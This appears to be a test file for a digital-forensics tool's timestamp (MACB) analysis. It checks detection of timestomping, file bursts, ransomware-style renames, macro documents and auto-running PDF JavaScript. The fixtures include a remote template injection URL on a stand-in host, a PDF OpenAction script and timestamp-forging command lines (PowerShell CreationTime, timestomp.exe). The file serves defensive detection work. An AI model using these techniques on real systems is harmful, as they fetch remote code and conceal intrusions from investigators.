// MACB analysis: $SI/$FN rules, bursts, and file times from content (documents, PE, shortcuts, archive entries).
import { Context } from '../js/ioc/context.js';
import { analyseMacb, macbRows, bodyfile, winPathOf } from '../js/ioc/macb.js';
import { analyze } from '../js/engine.js';
import { pdfDate } from '../js/parsers/docmeta.js';
let fail = 0;
const ok = (c, m) => { console.log(`${c ? 'PASS' : 'FAIL'}  ${m}`); if (!c) fail++; };
const enc = new TextEncoder();

// ------------------------------------------------------------ 1. rules on $MFT rows (CSV style ISO times)
const row = (entry, seq, parent, name, si, fn, inUse = true) => ({ entry, seq, inUse, isDir: false, parentPath: parent, name, size: 100, ads: [], si: { created: si[0], modified: si[1], accessed: si[2], recordChanged: si[3] }, fn: fn ? { created: fn[0], modified: fn[1], accessed: fn[2], recordChanged: fn[3] } : null });
const N = (s) => `2026-03-05T${s}Z`;
const rows = [
  { entry: 0, seq: 1, inUse: true, isDir: false, parentPath: '.', name: '$MFT', size: 1, ads: [], si: { created: '2025-01-10T08:00:00.1234567Z', modified: '', accessed: '', recordChanged: '' }, fn: null },
  // timestomped payload: $SI born 2019, $FN born at drop time, all four $SI identical whole seconds
  row(100, 3, '.\\Users\\bob\\AppData\\Local\\Temp', 'evil.exe', ['2019-01-01T00:00:00.0000000Z', '2019-01-01T00:00:00.0000000Z', '2019-01-01T00:00:00.0000000Z', '2019-01-01T00:00:00.0000000Z'], [N('12:00:01.1111111'), N('12:00:01.1111111'), N('12:00:01.1111111'), N('12:00:01.1111111')]),
  // M set forward past C
  row(101, 1, '.\\Users\\bob\\Documents', 'notes.txt', [N('10:00:00.5550000'), '2027-12-01T00:00:00.1000000Z', N('10:00:00.5550000'), N('10:00:01.0000000')], [N('10:00:00.5550000'), N('10:00:00.5550000'), N('10:00:00.5550000'), N('10:00:00.5550000')]),
  // B later than C
  row(102, 1, '.\\ProgramData\\x', 'svc.dll', [N('15:00:00.1234567'), N('09:00:00.1234567'), N('09:00:00.1234567'), N('09:00:05.1234567')], [N('09:00:00.1234567'), N('09:00:00.1234567'), N('09:00:00.1234567'), N('09:00:00.1234567')]),
  // shortcut target that was later backdated / replaced
  row(200, 4, '.\\Users\\bob\\Documents', 'invoice.docx', ['2020-06-01T09:00:00.1234567Z', N('08:00:00.1234567'), N('08:00:00.1234567'), N('12:05:00.1234567')], [N('08:00:00.1234567'), N('08:00:00.1234567'), N('08:00:00.1234567'), N('08:00:00.1234567')]),
  row(201, 9, '.\\Users\\bob\\Desktop', 'report.pdf', [N('13:00:00.1234567'), N('13:00:00.1234567'), N('13:00:00.1234567'), N('13:00:00.1234567')], [N('13:00:00.1234567'), N('13:00:00.1234567'), N('13:00:00.1234567'), N('13:00:00.1234567')]),
  // a PE whose file system times predate its compile time
  row(300, 2, '.\\Users\\bob\\Downloads', 'setup.exe', ['2021-01-01T10:00:00.1234567Z', '2021-01-01T10:00:00.1234567Z', N('12:30:00.1234567'), N('12:30:00.1234567')], [N('12:30:00.1234567'), N('12:30:00.1234567'), N('12:30:00.1234567'), N('12:30:00.1234567')]),
];
// burst: 60 files incl. 6 executables born in one minute in Temp
for (let i = 0; i < 60; i++) rows.push(row(1000 + i, 1, '.\\Users\\bob\\AppData\\Local\\Temp\\pkg', i < 6 ? `m${i}.exe` : `f${i}.dat`, [N(`12:10:${String(i % 60).padStart(2, '0')}.1000000`), N('12:10:00.1000000'), N('12:10:00.1000000'), N('12:11:00.1000000')], [N('12:10:00.1000000'), N('12:10:00.1000000'), N('12:10:00.1000000'), N('12:10:00.1000000')]));
// ransomware style: 250 files modified in one minute with a new extension
for (let i = 0; i < 250; i++) rows.push(row(5000 + i, 1, `.\\Users\\bob\\Documents\\d${i % 30}`, `file${i}.docx.akira`, [N('07:00:00.1000000'), N(`14:20:${String(i % 60).padStart(2, '0')}.2000000`), N('14:20:00.1000000'), N('14:20:59.1000000')], [N('07:00:00.1000000'), N('07:00:00.1000000'), N('07:00:00.1000000'), N('07:00:00.1000000')]));

const ctx = new Context();
ctx.fileTimes({ path: 'C:\\Users\\bob\\Documents\\invoice.docx', source: 'LNK target times', kind: 'recorded', file: 'C/Users/bob/AppData/Roaming/Microsoft/Windows/Recent/invoice.docx.lnk', B: N('08:00:00.1234567'), M: N('08:00:00.1234567'), A: N('08:00:00.1234567'), entry: 200, seq: 4 });
ctx.fileTimes({ path: 'C:\\Users\\bob\\Desktop\\report.pdf', source: 'Jump list target times', kind: 'recorded', file: 'x.automaticDestinations-ms', B: N('11:00:00.1234567'), M: N('11:00:00.1234567'), A: '', entry: 201, seq: 7 });
ctx.fileTimes({ path: 'C:\\Users\\bob\\Downloads\\setup.exe', source: 'PE header compile time', kind: 'embedded', file: 'img/setup.exe', extra: { compiled: '2026-03-01T00:00:00.000Z' } });
ctx.fileTimes({ path: 'C:\\Users\\bob\\Desktop\\report.pdf', source: 'PDF document metadata', kind: 'embedded', file: 'report.pdf', B: '2026-03-09T09:00:00.000Z', M: '2026-03-08T20:00:00.000Z', extra: { doc: true } });
const m = analyseMacb(ctx, { mft: { rows } }, {}, Date.parse('2026-04-01T00:00:00Z'));
const has = (rule, rx) => m.anomalies.some((a) => a.rule === rule && (!rx || rx.test(a.path)));
ok(has('siBeforeFn', /evil\.exe/), '$SI born before $FN born (evil.exe)');
ok(has('allSame', /evil\.exe/), 'all four $SI times identical whole seconds');
ok(has('preVolume', /evil\.exe/), 'born before the volume was formatted');
ok(has('modAfterChange', /notes\.txt/), 'M later than C');
ok(has('future', /notes\.txt/), 'time in the future');
ok(has('bornAfterChange', /svc\.dll/), 'B later than C');
ok(has('lnkBornBack', /invoice\.docx/), 'LNK recorded B is later than the current $MFT B (moved back)');
ok(has('replaced', /report\.pdf/), 'jump list recorded an older $MFT sequence: file replaced');
ok(has('compiledAfterFs', /setup\.exe/), 'PE compiled after file system B and M');
ok(has('docInconsistent', /report\.pdf/), 'PDF metadata created after modified');
ok(has('docModAfterFs', /report\.pdf/), 'PDF last saved after its file system M');
ok(m.clusters.some((c) => c.kind === 'Born' && c.files >= 60 && c.executables === 6), 'born burst of 60 files with 6 executables');
ok(has('burstMod') && m.anomalies.find((a) => a.rule === 'burstMod').sev === 'high', 'mass modification with one new extension is high');
ok(ctx.findings.some((f) => /^MACB: \$SI born before \$FN born/.test(f.title) && f.sev === 'high'), 'finding raised for the backdated executable');
ok(!m.anomalies.some((a) => /\$MFT$/.test(a.path)), 'NTFS metafiles skipped');
ok(/weak evidence/.test(m.accessNote), 'Accessed caveat without a SYSTEM hive');
ok(winPathOf('triage.zip/C/Users/bob/x.docx') === 'C:\\Users\\bob\\x.docx' && winPathOf('kape/C%3A/Windows/a.exe') === 'C:\\Windows\\a.exe', 'original path from collection layout');
ok(pdfDate("D:20260305120000+02'00'") === '2026-03-05T10:00:00.000Z', 'PDF date with zone offset');

// mactime rows and bodyfile from an "All MFT entries" style table
const tbl = { rows: [[100, 3, 'Y', 'File', '.\\Temp', 'a.exe', 10, N('01:00:00.0000000'), N('02:00:00.0000000'), N('02:00:00.0000000'), N('03:00:00.0000000'), N('01:00:00.0000000'), N('01:00:00.0000000'), N('01:00:00.0000000'), N('01:00:00.0000000'), '', '']] };
const mr = macbRows(tbl).rows;
ok(mr.length === 4 && mr[0][1] === '...b' && mr.some((r) => r[1] === 'ma..') && mr.some((r) => r[2] === '$FN' && r[1] === 'macb'), 'mactime style macb flags for $SI and $FN');
const bf = bodyfile([tbl]).trim().split('\n');
ok(bf.length === 2 && /^0\|C:\/Temp\/a\.exe\|100-128-3\|r\/rrwxrwxrwx\|0\|0\|10\|\d+\|\d+\|\d+\|\d+$/.test(bf[0]) && /\(\$FILE_NAME\)/.test(bf[1]), 'TSK body file lines for $SI and $FN');

// ------------------------------------------------------------ 2. end to end: documents inside a zip with NTFS extra times
const crcT = new Uint32Array(256).map((_, n) => { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; return c >>> 0; });
const crc = (b) => { let c = 0xffffffff; for (const x of b) c = crcT[(c ^ x) & 255] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0; };
function zip(files) {
  const parts = [], cd = []; let off = 0;
  for (const f of files) {
    const name = enc.encode(f.name), data = typeof f.data === 'string' ? enc.encode(f.data) : f.data;
    let extra = new Uint8Array(0);
    if (f.ft) { extra = new Uint8Array(36); const v = new DataView(extra.buffer); v.setUint16(0, 0x000a, true); v.setUint16(2, 32, true); v.setUint16(8, 1, true); v.setUint16(10, 24, true); const ft = (iso) => BigInt(Date.parse(iso)) * 10000n + 116444736000000000n; v.setBigUint64(12, ft(f.ft.m), true); v.setBigUint64(20, ft(f.ft.a), true); v.setBigUint64(28, ft(f.ft.c), true); }
    const lh = new Uint8Array(30 + name.length); const lv = new DataView(lh.buffer);
    lv.setUint32(0, 0x04034b50, true); lv.setUint16(4, 20, true); lv.setUint16(12, 0x6000, true); lv.setUint16(14, 0x5c65, true); lv.setUint32(14, crc(data), true); lv.setUint32(18, data.length, true); lv.setUint32(22, data.length, true); lv.setUint16(26, name.length, true); lh.set(name, 30);
    const ch = new Uint8Array(46 + name.length + extra.length); const cv = new DataView(ch.buffer);
    cv.setUint32(0, 0x02014b50, true); cv.setUint16(4, 20, true); cv.setUint16(6, 20, true); cv.setUint16(12, 0x6000, true); cv.setUint16(14, 0x5c65, true); cv.setUint32(16, crc(data), true); cv.setUint32(20, data.length, true); cv.setUint32(24, data.length, true); cv.setUint16(28, name.length, true); cv.setUint16(30, extra.length, true); cv.setUint32(42, off, true); ch.set(name, 46); ch.set(extra, 46 + name.length);
    parts.push(lh, data); cd.push(ch); off += lh.length + data.length;
  }
  const cdLen = cd.reduce((n, c) => n + c.length, 0);
  const eo = new Uint8Array(22); const ev = new DataView(eo.buffer); ev.setUint32(0, 0x06054b50, true); ev.setUint16(8, files.length, true); ev.setUint16(10, files.length, true); ev.setUint32(12, cdLen, true); ev.setUint32(16, off, true);
  const all = [...parts, ...cd, eo]; const out = new Uint8Array(all.reduce((n, p) => n + p.length, 0)); let p = 0; for (const a of all) { out.set(a, p); p += a.length; } return out;
}
const docx = zip([
  { name: '[Content_Types].xml', data: '<Types/>' },
  { name: 'docProps/core.xml', data: '<cp:coreProperties xmlns:cp="x" xmlns:dc="y" xmlns:dcterms="z"><dc:creator>Mallory</dc:creator><cp:lastModifiedBy>mallory</cp:lastModifiedBy><dcterms:created xsi:type="dcterms:W3CDTF">2026-03-04T10:00:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-05T09:00:00Z</dcterms:modified></cp:coreProperties>' },
  { name: 'docProps/app.xml', data: '<Properties><Application>Microsoft Office Word</Application><TotalTime>1</TotalTime></Properties>' },
  { name: 'word/vbaProject.bin', data: 'vba' },
  { name: 'word/_rels/settings.xml.rels', data: '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://203.0.113.9/t.dotm" TargetMode="External"/></Relationships>' },
]);
const pdf = enc.encode("%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 3 0 R >> endobj\n3 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj\n4 0 obj << /Author (Mallory) /CreationDate (D:20260304100000Z) /ModDate (D:20260305090000Z) /Producer (evil) >> endobj\n%%EOF\n");
const coll = zip([
  // KAPE style layout; zip keeps the original M (NTFS extra, UTC) which is older than the content's own save time
  { name: 'C/Users/bob/Documents/Q1.docm', data: docx, ft: { m: '2024-01-01T00:00:00Z', a: '2026-03-05T12:00:00Z', c: '2024-01-01T00:00:00Z' } },
  { name: 'C/Users/bob/Downloads/scan.pdf', data: pdf, ft: { m: '2026-03-05T09:00:02Z', a: '2026-03-05T12:00:00Z', c: '2026-03-05T09:00:00Z' } },
]);
const rep = await analyze([{ name: 'triage.zip', data: coll }]);
const f = (rx) => rep.findings.find((x) => rx.test(x.title));
const docRec = rep.files.find((x) => /Q1\.docm$/.test(x.name));
ok(docRec && docRec.status === 'parsed' && docRec.tool === 'Sudo-Z docmeta', 'docm parsed by docmeta, not rejected');
ok(f(/VBA macros: Q1\.docm/)?.sev === 'high', 'macro document in a user folder is high');
ok(f(/Remote template injection in Q1\.docm/)?.mitre.includes('T1221'), 'remote template injection (T1221)');
ok(rep.indicators.some((i) => i.value === 'http://203.0.113.9/t.dotm'), 'template URL becomes an indicator');
ok(f(/PDF with JavaScript, an automatic action/)?.sev === 'high', 'PDF JavaScript + OpenAction is high');
ok(rep.timeline.some((e) => /Document last saved \(OOXML metadata\)/.test(e.type) && e.time === '2026-03-05T09:00:00.000Z'), 'document save time on the super timeline');
ok(rep.macb?.anomalies.some((a) => a.rule === 'docModAfterFs' && /Q1\.docm/.test(a.path) && /ZIP entry/.test(a.detail)), 'docm saved after its archived file system M (NTFS extra times)');
ok(!rep.macb?.anomalies.some((a) => a.rule === 'docModAfterFs' && /scan\.pdf/.test(a.path)), 'PDF with matching times is not flagged');
ok(rep.macb?.embedded.some((e) => /ZIP entry \(UTC \(NTFS extra\)\)/.test(e.source) && e.M === '2024-01-01T00:00:00.0000000Z'), 'zip NTFS extra times recorded as container times');
ok(rep.meta.version === '1.16.0', 'version 1.16.0');

// ------------------------------------------------------------ 3. MFTECmd CSV: all eight times feed the same rules
const H = 'EntryNumber,SequenceNumber,InUse,ParentEntryNumber,ParentSequenceNumber,ParentPath,FileName,Extension,FileSize,ReferenceCount,ReparseTarget,IsDirectory,HasAds,IsAds,SI<FN,uSecZeros,Copied,SiFlags,NameType,Created0x10,Created0x30,LastModified0x10,LastModified0x30,LastRecordChange0x10,LastRecordChange0x30,LastAccess0x10,LastAccess0x30,UpdateSequenceNumber,LogfileSequenceNumber,SecurityId,ObjectIdFileDroid,LoggedUtilStream,ZoneIdContents,SourceFile,ParseErrors';
const csvRow = (e, pp, n, siB, fnB, siM, siC) => `${e},2,True,5,5,${pp},${n},.exe,10,1,,False,False,False,False,False,False,Archive,DosWindows,${siB},${fnB},${siM},${fnB},${siC},${fnB},${siB},${fnB},0,0,256,,,,x,`;
const csvText = [H, csvRow(40, '.\\Users\\bob\\AppData\\Roaming', 'upd.exe', '2026-03-05 12:00:00.1234567', '2026-03-05 12:00:00.1234567', '2026-03-09 12:00:00.1234567', '2026-03-05 12:00:01.1234567'), csvRow(41, '.\\Windows', 'ok.exe', '2026-03-05 12:00:00.1234567', '2026-03-05 12:00:00.1234567', '2026-03-05 12:00:00.1234567', '2026-03-05 12:00:00.1234567')].join('\r\n');
const rep2 = await analyze([{ name: '20260306_MFTECmd_$MFT_Output.csv', data: enc.encode(csvText) }]);
const allT = rep2.files[0].tables.find((t) => t.title === 'All MFT entries');
ok(allT && allT.columns.length === 17 && allT.rows[0][8] === '2026-03-09T12:00:00.1234567Z', 'MFTECmd CSV fills the 17 column All MFT entries table');
ok(rep2.macb?.anomalies.some((a) => a.rule === 'modAfterChange' && /upd\.exe/.test(a.path) && a.sev === 'high'), 'MFTECmd CSV: M later than C on a user-folder program is high');

// ---------------------------------------------------------------- 4. the journal, execution evidence and tooling as witnesses
const ctx2 = new Context();
const W = (s) => `2026-03-05T${s}Z`;
const rows2 = [
  { entry: 0, seq: 1, inUse: true, isDir: false, parentPath: '.', name: '$MFT', size: 1, ads: [], si: { created: '2025-01-10T08:00:00.1234567Z', modified: '', accessed: '', recordChanged: '' }, fn: null },
  // the file claims 2019 but the journal saw a data write and a timestamps-only change last March
  row(700, 1, '.\\Users\\bob\\AppData\\Roaming', 'svc.exe', ['2019-02-01T00:00:00.0000000Z', '2019-02-01T00:00:00.0000000Z', '2019-02-01T00:00:00.0000000Z', W('12:00:02.3456789')], [W('12:00:00.1234567'), W('12:00:00.1234567'), W('12:00:00.1234567'), W('12:00:00.1234567')]),
  // ran before it says it was born
  row(701, 1, '.\\Users\\bob\\Downloads', 'tool.exe', ['2026-03-20T10:00:00.1234567Z', '2026-03-20T10:00:00.1234567Z', '2026-03-20T10:00:00.1234567Z', '2026-03-20T10:00:00.1234567Z'], ['2026-03-20T10:00:00.1234567Z', '2026-03-20T10:00:00.1234567Z', '2026-03-20T10:00:00.1234567Z', '2026-03-20T10:00:00.1234567Z']),
  // the journal mentions it before it claims to have been born, and the creation record is not in the journal
  row(703, 1, '.\\ProgramData\\upd', 'agent.exe', ['2026-03-10T08:00:00.1234567Z', '2026-03-10T08:00:00.1234567Z', '2026-03-10T08:00:00.1234567Z', '2026-03-10T08:05:00.1234567Z'], ['2026-03-10T08:00:00.1234567Z', '2026-03-10T08:00:00.1234567Z', '2026-03-10T08:00:00.1234567Z', '2026-03-10T08:00:00.1234567Z']),
  // B is a whole second while the rest keep 100 ns precision
  row(702, 1, '.\\Users\\bob\\AppData\\Local\\Temp', 'mix.exe', [W('09:00:00.0000000'), W('09:00:01.7654321'), W('09:00:02.1112223'), W('09:00:03.9998887')], [W('09:00:01.7654321'), W('09:00:01.7654321'), W('09:00:01.7654321'), W('09:00:01.7654321')]),
];
const shared2 = { mft: { rows: rows2 }, usn: new Map([
  [700, { first: W('11:59:00'), last: W('12:00:02'), data: W('12:00:01'), create: W('11:59:00'), basicOnly: W('12:00:02'), name: 'svc.exe', reasons: 0 }],
  [703, { first: W('07:00:00'), last: W('07:30:00'), data: W('07:30:00'), create: '', basicOnly: '', name: 'agent.exe', reasons: 0 }],
  [702, { first: W('09:00:00'), last: W('09:00:03'), data: '', create: W('09:00:00'), basicOnly: '', name: 'mix.exe', reasons: 0 }],
]) };
ctx2.exec_({ path: 'C:\\Users\\bob\\Downloads\\tool.exe', tool: 'PECmd', file: 'TOOL.EXE-1234.pf', time: '2026-03-05T12:30:00Z', source: 'Prefetch' });
ctx2.event({ time: W('12:00:02'), tool: 'EvtxECmd', file: 'Security.evtx', type: 'Process created', desc: 'powershell.exe -c "(Get-Item C:\\Users\\bob\\AppData\\Roaming\\svc.exe).CreationTime = \'2019-02-01 00:00:00\'"' });
ctx2.event({ time: W('12:05:00'), tool: 'EvtxECmd', file: 'Security.evtx', type: 'Process created', desc: 'C:\\Users\\bob\\timestomp.exe -z "01/02/2019 00:00:00" svc.exe' });
const m2 = analyseMacb(ctx2, shared2, {}, Date.parse('2026-04-01T00:00:00Z'));
const h2 = (rule, rx, msg) => ok(m2.anomalies.some((a) => a.rule === rule && (!rx || rx.test(a.path + ' ' + a.detail))), msg);
h2('usnBasicOnly', /svc\.exe/, 'USN: a BasicInfoChange with nothing else is a timestamps-only edit');
ok(m2.anomalies.find((a) => a.rule === 'usnBasicOnly')?.detail.includes('2019'), 'and it says the file now claims a much earlier modified time');
h2('usnAfterMod', /svc\.exe/, 'USN: data written after the claimed modified time');
h2('usnBeforeBorn', /agent\.exe/, 'USN: the journal mentions the record before the file says it was born');
ok(!m2.anomalies.some((a) => a.rule === 'usnBeforeBorn' && /svc\.exe/.test(a.path)), 'not fired when the journal holds the FileCreate record, where B moved back rather than forward');
h2('ranBeforeBorn', /tool\.exe/, 'execution evidence: Prefetch says it ran before the born time');
ok(m2.anomalies.find((a) => a.rule === 'ranBeforeBorn')?.detail.includes('Prefetch'), 'and it names the artifact that saw the run');
h2('mixedPrecision', /mix\.exe/, 'one whole-second time beside 100 ns ones');
ok(ctx2.findings.some((f) => /Timestamp editing: timestomp \(Metasploit \/ MAFIA\)/.test(f.title) && f.sev === 'critical'), 'timestomp.exe on a command line is critical');
ok(ctx2.findings.some((f) => /Timestamp editing: a PowerShell timestamp assignment/.test(f.title)), 'a PowerShell CreationTime assignment is caught too');
ok(m2.sources.some((s) => /USN journal/.test(s.source)) && m2.sources.some((s) => /execution artifacts/.test(s.source)), 'the sources list names the journal and the run times');
for (const r of ['usnBasicOnly', 'usnAfterMod', 'usnBeforeBorn', 'ranBeforeBorn', 'mixedPrecision']) ok(!!m2.rules[r] && m2.rules[r].length > 10, `${r} is named in the rules map for the UI`);
ok(ctx2.findings.some((f) => /MACB: Timestamps rewritten, recorded in the USN journal/.test(f.title)), 'the journal rule raises its own finding');

console.log(fail ? `\n${fail} FAILED` : '\nall MACB checks passed');
process.exit(fail ? 1 : 0);
